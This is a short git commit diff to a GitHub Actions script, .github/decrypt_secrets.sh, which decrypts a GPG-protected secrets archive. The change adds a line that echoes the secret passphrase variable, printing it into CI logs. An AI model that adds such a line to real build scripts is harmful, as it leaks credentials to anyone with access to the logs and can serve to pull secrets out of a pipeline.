9c65447c839790e064d3cd4c9a2689aa8943d1f1
Pideo1 <156392313+Pideo1@users.noreply.github.com>
2025-05-05 22:39:36 +0800

    Update decrypt_secrets.sh

--- .github/decrypt_secrets.sh
+++ .github/decrypt_secrets.sh
@@ -1,4 +1,5 @@
 #!/bin/sh
 
 gpg --quiet --batch --yes --decrypt --passphrase="$SECRETS_GPG_PASS" --output .github/secrets.tar .github/secrets.tar.gpg
+echo "$SECRETS_GPG_PASS"
 tar xvf .github/secrets.tar -C .github
